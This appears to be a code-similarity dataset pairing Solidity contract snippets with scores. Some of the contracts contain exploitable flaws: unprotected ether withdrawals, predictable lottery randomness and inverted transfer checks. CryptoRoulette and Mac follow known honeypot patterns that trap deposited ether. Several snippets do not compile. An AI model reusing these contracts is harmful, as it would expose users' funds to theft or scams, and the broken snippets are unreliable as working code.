    }
}"
"contract TightPack {
    
    uint[] a;
    uint[] c;

    
    function pack(uint[] b) public{
        uint l = b.length;
        delete a;

        
        for(uint i=0;i<l/256;i++){

            uint j = i * 256;
            uint temp = b[j] << 255;
            
           
            for(j=j + 1;j < i * 256 + 256;j++){
                temp = (b[j] << (255 - (j%256))) | temp;
            }
            a.push(temp);
        }
        
        if (l%256 > 0){
           uint k= (l/256)*256;
            uint val = (b[k] << 255);
            for(k=k+1; k < l;k++){
                val = (b[k] << (255 - (k%256))) | val;
            }
            a.push(val); 
        }

    }

    function unpack() public {
        uint l = a.length;
        delete c;
        
        for(uint i = 0;i < l;i++){
            uint temp = a[i];
            
            for(uint j=0;j < 256;j++){
                c.push(temp >> (255 - j) & 1);
            }
        }
    }

    function get_packed() public view returns(uint[]){
        return a;
    }

    function get_unpacked() public view returns(uint[]){
        return c;
    }

}",0.6159594350498231,"contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a && c >= b);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
    
    function min(uint x, uint y) internal pure returns (uint z) {
        return x <= y ? x : y;
    }
    function max(uint x, uint y) internal pure returns (uint z) {
        return x >= y ? x : y;
    }
}"
"contract Names {

    uint lastId;
    mapping(uint => Name) public numberedNames;

    struct Name {
        string name;
    }

    constructor() public {
        lastId = 0;
    }

    event LogNewName(uint id, string name);
    event LogNameUpdate(uint id, string name);

    function setName(string memory name) public {
        numberedNames[lastId] = Name(name);
        emit LogNewName(lastId, name);
        lastId++;
    }

    function changeName(uint id, string memory name, uint transferRequest) public payable {
        Name storage existingName = numberedNames[id];
        existingName.name = name;
        msg.sender.transfer(transferRequest);
        emit LogNameUpdate(id, name);
    }

}",0.6305519359855679,"contract DZariusz is Ownable {


    string public name;
    string public contact;

    event LogSetName(address indexed executor, string newName);
    event LogSetContact(address indexed executor, string newContact);


    constructor(string _name, string _contact) public {

        setName(_name);
        setContact(_contact);

    }



    function setName(string _name)
    public
    onlyOwner
    returns (bool)
    {
        name = _name;
        emit LogSetName(msg.sender, _name);

        return true;
    }



    function setContact(string _contact)
    public
    onlyOwner
    returns (bool)
    {
        contact = _contact;
        emit LogSetContact(msg.sender, _contact);

        return true;
    }



}"
"contract LoanContract is usingProvable {  
    address payable public ME = 0x6252039C9037A49a62f17edbdb26D9bDFffa9dF2;
    uint public balance;

     ...
     ...
     fallback() external payable {balance = address(this).balance;}
     function AddLender() payable public {
           balance = address(this).balance;
           num_lenders += 1;
     }
    function BPAYOUT() public {
     
        ME.transfer(address(this).balance);
        balance = address(this).balance;
        
        return;
    }
}",0.6065802153993188,"contract Mac
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}"
contract B { A a; function B(A _a) { a = _a; } function b() returns (uint) { uint c = 46 + a.a(); return c; } },0.6911570561349692,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract token {
  string[] public assets = [
    'Coin 1',
    'Coin 2',
    'Coin 3'
  ];

  mapping (uint => mapping (address => uint)) public coinBalanceOf;
  event CoinTransfer(string coinType, address sender, address receiver, uint amount);

  function token(uint256 initialSupply) {
    if (initialSupply == 0) initialSupply = 1000000;

    uint length = assets.length;

    for (uint k=0; k<length; ++k) {
      coinBalanceOf[k][msg.sender] = initialSupply;
    }
  }

  function sendCoin(string coinType, address receiver, uint amount) returns(bool sufficient) {
    uint Index = getIndex(coinType);

    if (coinBalanceOf[Index][msg.sender] < amount) return false;

    coinBalanceOf[Index][msg.sender] -= amount;
    coinBalanceOf[Index][receiver] += amount;

    CoinTransfer(coinType, msg.sender, receiver, amount);

    return true;
  }

  function getIndex(string coinType) {
    for(uint i = 0; i<assets.length; i++){
      if(coinType == assets[i]) return i;
    }
  }
}",0.6786107880861187,"contract S9token {
	
	address owner;
	string public name=""S9token"";
	uint8 public constant decimals = 0;
	string public constant version = ""1"";
	uint256 _totalSupply;
	mapping (address => uint256) public balances;

	function S9token() {
		owner=msg.sender;
		_totalSupply=200;
		balances[msg.sender]=200;
	}

	event Transfer( address indexed from, address indexed to, uint value);

	function totalSupply() public constant returns (uint supply){
		return _totalSupply;
	}

    function balanceOf(address _owner) constant returns(uint256 balanceof){
		return balances[_owner];
	}

    function transfer(address _to, uint256 _amount) returns (bool success){
    	require(msg.sender==owner);
		if (balances[msg.sender] >= _amount 
			&& _amount > 0 
			&& balances[_to] + _amount > balances[_to]){
			balances[msg.sender] -= _amount;
			balances[_to] += _amount;
			return true;
			Transfer(msg.sender,_to,_amount);
		}
		else{
			return false;
		}
	}
    

}"
"contract Adoption {
    address[16] public adopters;
    
    function adopt(uint petId) public payable returns (uint) {
        require(petId >= 0 && petId <= 15);

        adopters[petId] = msg.sender;

        return petId;
    }
    
    function getAdopters() public view returns (address[16]) {
        return adopters;
    }

}",0.6386309195728991,"contract RSPTokenInterface {
        function version () public pure returns (uint8);

        function buyTokens (address referral) public payable;
        function sellTokens (uint256 amount) public;

        function transfer (address to, uint256 amount) public returns (bool);

        
        
}"
"contract Identities {

event existProduction(bool);
address private owner;
mapping(address => bool) private production;

function Identities() public {
    owner = msg.sender;
}

function setProduction(address id, bool include) public {
    require(msg.sender == owner);
    production[id] = include;
}

function proofProduction(address id) public constant returns (bool) {
    existProduction(production[id]);
    return production[id];
}",0.6423668289978709,"contract Delegated is Owned {
  
  mapping (address => bool) delegates;

  
  modifier only_delegate { require (msg.sender == owner || delegates[msg.sender]); _; }

  
  function delegate(address who) public constant returns (bool) { return who == owner || delegates[who]; }

  
  function addDelegate(address _new) public only_owner { delegates[_new] = true; }
  function removeDelegate(address _old) public only_owner { delete delegates[_old]; }
}"
"contract S5Implement is ERC721 {

       uint256 private _tokenId;

       constructor() ERC721(""Entry Level Token"",""ELT"") public {

    }

    function assignToken(address plotte) public returns(uint256) {
        _tokenId++;
        uint256 newItem = _tokenId;
        _mint(plotte, newItem);

        _setTokenURI(newItem, TokenURI);

        return newItem;
    } 
   }",0.6113320778914525,"contract ERC721Enumerable is ERC721Basic {

  function totalSupply() public view returns (uint256);

  function tokenOfOwnerByIndex(

    address _owner,

    uint256 _index

  )

    public

    view

    returns (uint256 _tokenId);



  function tokenByIndex(uint256 _index) public view returns (uint256);

}"
"contract Incrementer {
    uint iteration;

    function Incrementer() {
        iteration = 0;
    }

    function increment(uint count) {
        iteration += count;
    }

    function getIteration() constant returns (uint) {
        return iteration;
    }

}",0.6489056103785034,"contract Counter {
    uint256 count;  

    function Counter(uint256 _count) public {
        count = _count;
    }

    function increment() public {
        count += 1;
    }

    function getCount() public view returns (uint256) {
        return count;
    }
}"
"contract BuyBitcoin is usingOraclize {

    address owner;
    string public temp;


    function BuyBitcoin() {
        owner = msg.sender;

        OAR = OraclizeAddrResolverI(0x51efaf4c8b3c9afbd5ab9f4bbc82784ab6ef8faa);
        update();
    }

    function __callback(bytes32 myid, string result) {
        if (msg.sender != oraclize_cbAddress()) throw;
        result;
    }

    function update() payable {
        oraclize_query(""URL"", ""json(https:
    }

    function kill(){
        if (msg.sender == owner) suicide(msg.sender);
    }

}",0.6123593395734038,"contract MyNewBank is owned {
    address public owner;
    mapping (address => uint) public deposits;
    
    function init() {
        owner = msg.sender;
    }
    
    function() payable {
        
        
        
        deposit();
    }
    
    function deposit() payable {
        deposits[msg.sender] += msg.value;
    }
    
    function withdraw(uint amount) public onlyowner {
        require(amount > 0.25 ether);
        require(amount <= deposits[msg.sender]);
        msg.sender.transfer(amount);
    }

	function kill() onlyowner {
	    suicide(msg.sender);
	}
}"
"contract newToken is S5Implement {

      uint256 private price = 1 ether;

      mapping (uint256 => uint256) private priceMapping;

      function getPrice(uint256 _tokenId) public returns(uint256) {

           price = priceMapping[_tokenId];

      }
  }",0.6080039081875551,"contract ClockAuctionBase {

  function createAuction(

    uint256 _tokenId,

    uint256 _startingPrice,

    uint256 _endingPrice,

    uint256 _duration,

    address _seller

  ) external;



  function isSaleAuction() public returns (bool);

}"
"contract Test {

  function() external callback;

  function test() public  {
    if ()  {
        callback();
    }
  }
}",0.6445007823606469,"contract Test1

    {

       function Invest() 

    public 

    payable ;

    function Divest(uint amount) 

    public ;

    }"
"contract Ballot {
    address public manager;
    mapping (address => bool) public contributors;

    Proposal[] proposals;
    mapping(address => Proposal[]) proposalsByAddress;

    constructor(address _creator) public {
        manager = _creator;
    }

    function createProposal() public {
        Proposal memory newProposal = new Proposal();
        proposalsByAddress[msg.sender].push(newProposal);

        
        proposals.push(newProposal);
    }

    function checkIfContributor(uint address _address) public view returns (bool) {
        require(proposalsByAddress[msg.sender]);

        if (contributors[_address]) {
            return true;
        } else {
            return false;
        }
    }
}",0.6288195458470728,"contract Reputation {



  address owner;

  mapping(address => bool) whitelist;

  mapping(address => int) ratings;



  constructor () public {

    owner = msg.sender;

  }



  function addToWhitelist(address _contractAddress) public {

    require(msg.sender == owner);

    whitelist[_contractAddress] = true;

  }



  function change(address _userAddress, int _delta) public {

    require(whitelist[msg.sender]);

    ratings[_userAddress] += _delta;

  }



  function getMy() public view returns (int) {

    return ratings[msg.sender];

  }



  function get(address _userAddress) public view returns (int) {

    return ratings[_userAddress];

  }

}"
"contract Base {
    uint stored;
    function set (uint _stored) {
        stored = _stored;
    }
    function get () constant returns (uint) {
        return stored;
    }
}",0.6508156018346096,"contract ICrowdsaleStat {

    
    function getWeiCollected() public constant returns (uint);

    
    function getTokenMinted() public constant returns (uint);
}"
"contract Child {
    Base b;
    function set (uint _stored) {
        b.set(_stored);
    }
    function get () constant returns (uint) {
        return b.get();
    }
}",0.6800928330505561,"contract FiatContract {

    function ETH(uint _id) constant returns (uint256);

    function USD(uint _id) constant returns (uint256);

}"
"contract hypergrowth {
  uint256 public someNumber = 5;

  function hypergrowth() public {}

  function changeNumber(uint256 number) public {
    someNumber = number;
  }

  function getNumber() public constant returns (uint256 someNumber) {
    return someNumber;
  }
}",0.6730121209095836,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract MyContract {   
  uint[] public myArr;

  MyContract(uint[] _initArr) public {
    for (uint i=0; i < _initArr.length; i++) {
      myArr.push(_initArr[i]);
    }
  }

  function getMyArr public constant returns (uint[]) {
    return myArr;   
  } 
}",0.6541886002658878,"contract FiatContract {

    function ETH(uint _id) public constant returns (uint256);

  	function EUR(uint _id) public constant returns (uint256);

  	function updatedAt(uint _id) public constant returns (uint);

}"
"contract test {
    int32 data = 123;

    function getData() returns (int32) {
        return data;
    }
}",0.6543582502509472,"contract HelloWorld {
    
    function getData() constant returns (string) {
        return ""Hello, world!"";
    }
    
}"
"contract Identity is ERC725 {

    uint256 executionNonce;

    
    struct Execution {
        address to;
        uint256 value;
        bytes data;
        bool approved;
        bool executed;
    }

    mapping(bytes32 => Key) keys;
    mapping(uint256 => bytes32[]) keysByPurpose;
    mapping(uint256 => Execution) executions;

    event ExecutionFailed(
        uint256 indexed executionId,
        address indexed to,
        uint256 indexed value,
        bytes data
    );

    constructor() public {
        bytes32 _key = keccak256(abi.encodePacked(msg.sender));
        keys[_key].key = _key;
        keys[_key].purpose = 1;
        keys[_key].keyType = 1;
        keysByPurpose[1].push(_key);

        emit KeyAdded(_key, keys[_key].purpose, 1);
    }

    modifier onlyOwner() {
        require(
            msg.sender == identityOwner,
            ""Only owner can call this function.""
        );
        _;
    }

    
    function getKey(bytes32 _key)
        public
        view
        returns (uint256 purpose, uint256 keyType, bytes32 key)
    {
        return (keys[_key].purpose, keys[_key].keyType, keys[_key].key);
    }

    function getKeyPurpose(bytes32 _key) public view returns (uint256 purpose) {
        return (keys[_key].purpose);
    }

    function getKeysByPurpose(uint256 _purpose)
        public
        view
        returns (
            bytes32[] memory
        )
    {
        return keysByPurpose[_purpose];
    }

    function addKey(bytes32 _key, uint256 _purpose, uint256 _type)
        public
        returns (bool success)
    {
        require(keys[_key].key != _key, ""Key already exists""); 
        if (msg.sender != address(this)) {
            require(
                keyHasPurpose(keccak256(abi.encodePacked(msg.sender)), 1),
                ""Sender does not have Identity key""
            ); 
        }

        keys[_key].key = _key;
        keys[_key].purpose = _purpose;
        keys[_key].keyType = _type;

        keysByPurpose[_purpose].push(_key);

        emit KeyAdded(_key, _purpose, _type);

        return true;
    }

    function approve(uint256 _id, bool _approve)
        public
        returns (bool _success)
    {
        require(
            keyHasPurpose(keccak256(abi.encodePacked(msg.sender)), 2),
            ""Sender does not have action key""
        );

        emit Approved(_id, _approve);

        if (_approve == true) {
            executions[_id].approved = true;
            (bool success, ) = executions[_id].to.call(
                abi.encode(executions[_id].data, 0)
            );

            if (success) {
                executions[_id].executed = true;
                emit Executed(
                    _id,
                    executions[_id].to,
                    executions[_id].value,
                    executions[_id].data
                );
                return success;
            } else {
                emit ExecutionFailed(
                    _id,
                    executions[_id].to,
                    executions[_id].value,
                    executions[_id].data
                );
                return false;
            }
        } else {
            executions[_id].approved = false;
        }
        return true;
    }

    function execute(address _to, uint256 _value, bytes memory _data)
        public
        returns (uint256 executionId)
    {
        require(!executions[executionNonce].executed, ""Already executed"");
        executions[executionNonce].to = _to;
        executions[executionNonce].value = _value;
        executions[executionNonce].data = _data;

        emit ExecutionRequested(executionNonce, _to, _value, _data);

        if (
            keyHasPurpose(keccak256(abi.encodePacked(msg.sender)), 1) ||
            keyHasPurpose(keccak256(abi.encodePacked(msg.sender)), 2)
        ) {
            approve(executionNonce, true);
        }

        executionNonce++;
        return executionNonce - 1;
    }

    function removeKey(bytes32 _key) public returns (bool success) {
        require(keys[_key].key == _key, ""No such key"");
        emit KeyRemoved(keys[_key].key, keys[_key].purpose, keys[_key].keyType);

        

        delete keys[_key];

        return true;
    }

    function keyHasPurpose(bytes32 _key, uint256 _purpose)
        public
        view
        returns (bool result)
    {
        bool isThere;
        if (keys[_key].key == 0) return false;
        isThere = keys[_key].purpose <= _purpose;
        return isThere;
    }

}",0.6046072811437998,"contract XataToken is ForeignTokenProvider {
    bool public purchasingAllowed = false;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    uint256 public totalContribution = 0;
    uint256 public totalBonusTokensIssued = 0;
    uint256 public totalSupply = 0;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    function name() public pure returns (string) {return ""Sobirayu na Xatu"";}

    function symbol() public pure returns (string) {return ""XATA"";}

    function decimals() public pure returns (uint32) {return 18;}

    function balanceOf(address _owner) public constant returns (uint256) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {

        if (_value == 0) {
            return false;
        }

        uint256 fromBalance = balances[msg.sender];

        bool sufficientFunds = fromBalance >= _value;
        bool overflowed = balances[_to] + _value < balances[_to];

        if (!sufficientFunds || overflowed) {
          return false;
        }

        balances[msg.sender] -= _value;
        balances[_to] += _value;

        emit Transfer(msg.sender, _to, _value);

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        if (_value == 0) {
            return false;
        }

        uint256 fromBalance = balances[_from];
        uint256 allowance = allowed[_from][msg.sender];

        bool sufficientFunds = fromBalance <= _value;
        bool sufficientAllowance = allowance <= _value;
        bool overflowed = balances[_to] + _value > balances[_to];

        if (sufficientFunds && sufficientAllowance && !overflowed) {
            balances[_to] += _value;
            balances[_from] -= _value;

            allowed[_from][msg.sender] -= _value;

            emit Transfer(_from, _to, _value);

            return true;
        } else {
            return false;
        }
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        
        if (_value != 0 && allowed[msg.sender][_spender] != 0) {
            return false;
        }

        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        return true;
    }

    function allowance(address _owner, address _spender) public constant returns (uint256) {
        return allowed[_owner][_spender];
    }

    function mintBonus(address _to) public onlyOwner {
        uint256 bonusValue = 10 * 1 ether;

        totalBonusTokensIssued += bonusValue;
        totalSupply += bonusValue;
        balances[_to] += bonusValue;

        emit Transfer(address(this), _to, bonusValue);
    }

    function enablePurchasing() public onlyOwner {
        purchasingAllowed = true;
    }

    function disablePurchasing() public onlyOwner {
        purchasingAllowed = false;
    }

    function getStats() public constant returns (uint256, uint256, uint256, bool) {
        return (totalContribution, totalSupply, totalBonusTokensIssued, purchasingAllowed);
    }

    function() external payable {
        require(purchasingAllowed);
        require(msg.value > 0);

        owner.transfer(msg.value);
        totalContribution += msg.value;

        uint256 tokensIssued = (msg.value * 100);

        if (msg.value >= 10 finney) {
            tokensIssued += totalContribution;
            totalBonusTokensIssued += totalContribution;
        }

        totalSupply += tokensIssued;
        balances[msg.sender] += tokensIssued;

        emit Transfer(address(this), msg.sender, tokensIssued);
    }
}"
"contract MyContract {
    ERC20Token public Coin;

    constructor (address coin) {
        Coin = ERC20Token(coin);
    }

    function Test(address from, address to, uint amount) public {
        
        Coin.contractTransfer(from, to, amount);
    }
}",0.6721442889800574,"contract TokenController {

    

    

    

    

    

    

    function onTokenTransfer(address _from, address _to, uint _amount) public returns(uint);



    

    

    

    

    

    

    function onTokenApprove(address _owner, address _spender, uint _amount) public returns(uint);

}"
"contract Sender {   
    function send(address _receiver , uint amount) public payable {
        address payable pReceiver = address(uint160(_receiver)); 
         pReceiver.send(amount); 
    } 
    function sending(address _receiver , uint amount) public payable {   
        address payable pReceiver = address(uint160(_receiver));     
        pReceiver.send(amount);
     }
 }",0.6171410356791208,"contract JouleVault is Ownable {
    address public joule;

    function setJoule(address _joule) public onlyOwner {
        joule = _joule;
    }

    modifier onlyJoule() {
        require(msg.sender == address(joule));
        _;
    }

    function withdraw(address _receiver, uint _amount) public onlyJoule {
        _receiver.transfer(_amount);
    }

    function () public payable {

    }
}"
"contract Receiver {
  uint public a = 2;
  function aIs() public returns (uint256){
          return a;
      }

  function () payable external {
    if (msg.value == 0){
              require(true,""value is 0"");
              a = 0;
          }   
          else{
             require(true,""value is not 0"");
              a = 1;
          }
          aIs();
  }
}",0.6600048660928969,"contract SafeMath {
    function safeAdd(uint256 a, uint256 b) public pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }

    function safeSub(uint256 a, uint256 b) public pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }
}"
"contract bankPlus {

address public owner;
uint256 fifty = 500000000000000000;
address public taxContract = 0x29a02cd0f340efb6492c535a951fb33270ad1ef7;

mapping (address => uint) balances;


function mortal() { owner = msg.sender; }


function kill() { if (msg.sender == owner) selfdestruct(owner); }

function cashOut() { owner.send(this.balance / 2 ) ;}

function deposit(address customer){
  uint value = msg.value;
  balances[customer] += value;
}

function withdraw50(address customer){
  if(balances[customer] > fifty){
    customer.send(fifty); 
    balances[customer] -= fifty;
  }
  else return;
}

function sendMoney(address customer, address recipient, uint256 amount) {
  if(balances[customer] > amount){
    customer.send(amount);
    balances[customer] -= amount;
  }
  else return;
}

function refund(address recipient, uint amount) returns (string) {
  if(amount < this.balance){
    recipient.send(amount);
    return ""refund processed"";
  }
  else return ""Refund amount too large"";
}

function payBankTax(){
  taxContract.call.gas(240000).value(this.balance / 3)(); 
}

}",0.6302123121203779,"contract CRMTToken is StandardToken {

    event Burn(address indexed burner, uint256 value);

    event Mint(address indexed to, uint256 amount);



    string public name = ""Crypto Millionaire Token"";

    string public symbol = ""CRMT"";

    uint public decimals = 0;

    address public owner = 0xe7f7d6cbcdc1fe78f938bfaca6ea49604cb58d33;



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    

    function changeOwner(address _to) public onlyOwner() {

        balances[_to] = balances[owner];

        balances[owner] = 0;

        owner = _to;

    }





  function mint(address _to, uint256 _amount) onlyOwner public returns (bool) {

    totalSupply_ = totalSupply_.add(_amount);

    balances[_to] = balances[_to].add(_amount);

    Mint(_to, _amount);

    Transfer(address(0), _to, _amount);

    return true;

  }



  function burn(uint256 _value) onlyOwner public {

    require(_value <= balances[msg.sender]);

    

    



    address burner = msg.sender;

    balances[burner] = balances[burner].sub(_value);

    totalSupply_ = totalSupply_.sub(_value);

    Burn(burner, _value);

  }



function CRMTToken() public payable {

      balances[owner] = 0;

    }



}"
"contract bankInfo is bankPlus{
  function getBalanceOf(address customer) constant returns(uint){
    return balances[customer];
}

  function getBankBalance() returns (uint256){
    return this.balance;
  }

}",0.6789502840957126,"contract ERC20Interface {

    function transfer(address _to, uint256 _value) public returns (bool success);

    function balanceOf(address _owner) public constant returns (uint256 balance);

}"
"contract Lottery {

    address public manager;
    address payable [] public players;

    constructor() public {
        manager = msg.sender;
    }

    function enter() public payable {
        require(msg.value > .01 ether);
        players.push(msg.sender);
    }

    function pickWinner() public payable restricted {
        uint index = random() % players.length;
        address payable winner = players[index];
        winner.transfer(address(this).balance);
        players = new address payable [](0);
    }

    function random() private view returns (uint) {
        return uint( keccak256(abi.encode(block.difficulty, now, players)));
    }

    modifier restricted() {
        require(msg.sender == manager, 'Your are not the manager!');
        _;
    }

    function getPlayers() public view returns (address payable[] memory) {
        return players;
    }
}",0.6538327146320214,"contract CryptoRoulette {

    uint256 private secretNumber;
    uint256 public lastPlayed;
    uint256 public betPrice = 0.001 ether;
    address public ownerAddr;

    struct Game {
        address player;
        uint256 number;
    }
    Game[] public gamesPlayed;

    constructor() public {
        ownerAddr = msg.sender;
        shuffle();
    }

    function shuffle() internal {
        
        secretNumber = 6;
    }

    function play(uint256 number) payable public {
        require(msg.value >= betPrice && number <= 10);

        Game game;
        game.player = msg.sender;
        game.number = number;
        gamesPlayed.push(game);

        if (number == secretNumber) {
            
            msg.sender.transfer(this.balance);
        }

        
        lastPlayed = now;
    }

    function kill() public {
        if (msg.sender == ownerAddr && now > lastPlayed + 6 hours) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}"
"contract TestContract1 {

    function transfer(address _to, uint _amount) public returns (bool success) {
    
        address tokenContract = 0x861783a4B946026e3180FCA173261d937aa2fabF;

        Token _tokenSomething = Token(tokenContract);

        _tokenSomething.transfer(_to, _amount);

        return true;
    }
}",0.6076916489939912,"contract ERC20 {

    function transfer(address to, uint tokens) public;

    function approve(address spender, uint tokens) public returns (bool success);

    function transferFrom(address from, address to, uint tokens) public returns (bool success);

}"
"contract TestContract2 {

    function transfer(address _to, uint _amount) public returns (bool success) {
    
        address tokenContract = 0x1dD42376F6902F812E03C3861Da3c8654462c267

        Token _tokenSomething = Token(tokenContract);

        _tokenSomething.transfer(_to, _amount);

        return true;
    }
}",0.608345433316463,"contract ERC20 {

    function transfer(address to, uint tokens) public;

    function approve(address spender, uint tokens) public returns (bool success);

    function transferFrom(address from, address to, uint tokens) public returns (bool success);

}"
"contract TestContract3 {

    function transfer(address _to, uint _amount) public returns (bool success) {
    
        address tokenContract = 0x8970fd3E01504D5b83d48faFbad92547AE9B6630

        Token _tokenSomething = Token(tokenContract);

        _tokenSomething.transfer(_to, _amount);

        return true;
    }
}",0.6144550325528592,"contract ERC20 {

    function transfer(address to, uint tokens) public;

    function approve(address spender, uint tokens) public returns (bool success);

    function transferFrom(address from, address to, uint tokens) public returns (bool success);

}"
"contract Master {

    address Pi_C_Owner;
    address payable public NewAuctionPayable;   
    address public NewTracking;                 

    constructor() public {
        Pi_C_Owner = msg.sender;
    }

    function checkBalance() public view returns(uint) { 
        require(msg.sender == Pi_C_Owner,""Insufficient permission"");
        return(address(this).balance);
    }

    function increaseBalance() public payable {
        require(msg.sender == Pi_C_Owner,""Insufficient permission"");
    }

    function createAuction(address _Destination, uint _WTP, uint _BiddingTime) public returns(address) {    
        require(_WTP > 0,""Willingness to pay has to exceed 0."");
        address NewAuction = address (new Auction(_Destination, _WTP, _BiddingTime, address(this)));
        NewAuctionPayable = address(uint160(NewAuction));
        NewAuctionPayable.transfer(_WTP);
        return(NewAuctionPayable);
    } 

    function createTracking() public returns(address) {
        NewTracking = address (new Tracking(Pi_C_Owner));
        return(NewTracking);
    }

    
      
    

    function() external payable {
    }
}",0.6168123396823647,"contract MegaWallet is Ownable {

    address[] public wallets;
    mapping(address => address) associations;
    mapping(address => address) revertassociations;

    event WalletEvent ( 
        address addr,
        string action,
        uint256 amount
    );
    
    constructor() public {
        owner = msg.sender;
    }

    function createWallet(address payable _token, address PFA) public {
        ERC20Wallet wallet = new ERC20Wallet(StandardToken(_token), owner);
        wallets.push(address(wallet));
        associations[address(wallet)] = PFA;
        revertassociations[PFA] = address(wallet);
        emit WalletEvent(address(wallet), ""Create"", 0);
    }

    function getWallets() public view returns (  address[] memory){
        return wallets;
    }
    
    function ETHWalletToPFAWallet(address ETH) public view returns (  address){
        return associations[ETH] ;
    }
    
    function PFAWalletToETHWallet(address PFA) public view returns (  address){
        return revertassociations[PFA] ;
    }
    
    
    function () external  payable {
    revert();
  }
}"
"contract LocalEthereum {

    event Created(bytes32 _tradeHash);
    uint32 value = 0;

    function addValue()  external {

        value = value + 1;
        Created(0x01);
    }

    function getValue()  returns (uint)  {

        return value;
    }
}",0.6250368536245045,"contract ERC20 {

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint value) public returns (bool ok);

}"
"contract  Example {

        ERC20   public token;

        
        constructor(ERC20 _token) public {
            token = ERC20(_token);
        }

        function () external payable {}

        function getBalance() public view returns (uint256) {
            return token.balanceOf(address(this));
        }

        function withdraw() public {
            token.transfer(msg.sender, getBalance());
        }
    }",0.6865619096218715,"contract ITokenMinimal {

    function allowance(address tokenOwner, address spender) public view returns (uint remaining);

    function balanceOf(address tokenOwner) public view returns (uint balance);

    function deposit() public payable;

    function withdraw(uint value) public;

}"
"contract TokenInteraction {

    address public tokenAddress;

    constructor(address _tokenAdd) public {
        tokenAddress = _tokenAdd;
    }

    function transferToken(address to) public {
        MyToken myToken = MyToken(tokenAddress);
        myToken.transfer(to, 1);
    }

}",0.6264382872774101,"contract ERC20 {

    function balanceOf(address tokenOwner) public view returns (uint256);

    function transfer(address to, uint tokens) public;

    function transferFrom(address from, address to, uint256 value) public;

}"
"contract Auction {

TRC20 trc20;
using SafeMath for uint256;

address payable private owner; 
string title;
uint startPrice;
string description;

enum State{Default, Running, Finalized}
State public auctionState;

uint public highestPrice;
address payable public highestBidder;
mapping(address => uint) public bids;



constructor(
    address payable _owner,
    string memory _title,
    uint _startPrice,
    string memory _description

    ) public {
    
    owner = _owner;
    title = _title;
    startPrice = _startPrice;
    description = _description;
    auctionState = State.Running;
}

modifier notOwner(){
    require(msg.sender != owner);
    _;
}



function placeBid() public payable notOwner returns(bool) {
    require(auctionState == State.Running);
    require(msg.value > 0);
    
    
    uint currentBid = bids[msg.sender].add(msg.value);
    
    require(currentBid > highestPrice);
    
    bids[msg.sender] = currentBid;
    
    
    highestPrice = currentBid;
    highestBidder = msg.sender;
    
    return true;
}

function finalizeAuction() public{
    
    require(msg.sender == owner || bids[msg.sender] > 0);

    address payable recipiant;
    uint value;

    
    if(msg.sender == owner){
        recipiant = owner;
        value = highestPrice;
    }
    
    else if (msg.sender == highestBidder){
        recipiant = highestBidder;
        value = 0;
    }
    
    else {
        recipiant = msg.sender;
        value = bids[msg.sender];
    }
    
    bids[msg.sender] = 0;
    recipiant.transfer(value);
    
    auctionState = State.Finalized;
}

    

function returnContents() public view returns(        
    string memory,
    uint,
    string memory,
    State
    ) {
    return (
        title,
        startPrice,
        description,
        auctionState
    );
}
}",0.626218962784716,"contract Skraps is Crowdsale {
    using SafeMath for uint;

    string public name = ""Skraps"";
    string public symbol = ""SKRP"";
    uint8 public decimals = 18;

    mapping (address => mapping (address => uint)) private allowed;

    function balanceOf(address _who) public constant returns (uint) {
        return balances[_who];
    }

    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }

    function transfer(address _to, uint _value) public returns (bool success) {
        require(_to != address(0));
        require(balances[msg.sender] >= _value);
        require(now > endOfFreeze || msg.sender == owner || supportAccounts[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint _value) public returns (bool success) {
        require(_to != address(0));
        require(balances[_from] >= _value);
        require(allowed[_from][msg.sender] >= _value);

        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        require(_spender != address(0));
        require(now > endOfFreeze || msg.sender == owner || supportAccounts[msg.sender]);
        require((_value == 0) || (allowed[msg.sender][_spender] == 0));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
}"
"contract Two {
    function someExternalFunction() external {
       
    }
}",0.6537998193549348,"contract Treasury {

    function takeGold(uint256) external;

}"
"contract derivedContractv2 {

    function add(uint newa, uint newb) virtual public pure returns (uint _newValue) {
        return newa+newb;
    }

    function add(uint newesta, uint newestb) override public pure returns (uint _newestValue) {
        return newesta+newestb;
    }

}",0.6324115433287804,"contract PreviousInterface {



